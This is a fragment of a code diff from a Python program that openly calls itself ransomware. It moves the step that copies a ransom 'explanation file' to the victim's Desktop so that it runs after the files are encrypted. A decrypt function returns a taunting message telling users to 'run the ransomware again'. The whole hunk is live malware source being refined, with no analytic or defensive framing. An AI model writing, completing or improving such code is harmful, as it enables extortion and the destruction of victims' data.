@@ -123,13 +123,13 @@ async def decrypt_files(transaction_id):
     return 'Successfully decrypted files. If you want to use service again please run the ransomware again :)'
 
 async def main():
-    # copy explanation file to desktop
-    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-    shutil.copy(EXPLANATION_FILENAME, desktop_path)
-
     rsa_cipher.setup()
 
     await encrypt_files()
+
+    # copy explanation file to desktop
+    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+    shutil.copy(EXPLANATION_FILENAME, desktop_path)
 
     print('Successully encrypted files')
 
